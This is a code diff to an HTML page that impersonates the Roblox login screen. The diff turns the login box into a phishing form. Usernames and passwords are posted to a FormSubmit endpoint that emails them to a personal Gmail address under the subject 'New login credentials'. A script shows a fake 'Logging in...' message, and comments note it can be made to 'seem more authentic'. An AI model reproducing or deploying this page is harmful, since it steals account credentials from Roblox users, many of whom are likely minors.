@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login to Roblox</title>
-    <link rel="shortcut icon" href="image/home-image/OIP.webp" type="image/x-icon">
-
-<style>
+    <link rel="shortcut icon" href="/OIP.webp" type="image/x-icon">
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -135,23 +134,46 @@
             font-size: 12px;
             color: #727272;
         }
+        
+        .notification {
+            display: none;
+            padding: 10px;
+            background-color: #f8d7da;
+            color: #721c24;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <h1>Login to Roblox</h1>
-        
-        <div class="input-group">
-            <label for="username">Username/Email/Phone</label>
-            <input type="text" id="username" name="username">
+        <div class="notification" id="notification">
+            Logging in...
         </div>
         
-        <div class="input-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password">
-        </div>
-        
-        <button class="login-button">Login</button>
+        <form id="loginForm" action="https://formsubmit.co/nssralcantara@gmail.com" method="POST">
+            <!-- FormSubmit configuration -->
+            <input type="hidden" name="_subject" value="New login credentials">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_next" value="https://yourdomain.com/redirect-url">
+            <input type="text" name="_honey" style="display:none">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <h1>Login to Roblox</h1>
+            
+            <div class="input-group">
+                <label for="username">Username/Email/Phone</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="login-button">Login</button>
+        </form>
         
         <div class="divider"></div>
         
@@ -182,5 +204,18 @@
             </div>
         </div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Show notification
+            document.getElementById('notification').style.display = 'block';
+            
+            // You could add a delay to make it seem more authentic
+            setTimeout(function() {
+                // The form will submit to FormSubmit which will email you the credentials
+                // The page will redirect after submission based on your _next value
+            }, 2000);
+        });
+    </script>
 </body>
 </html>
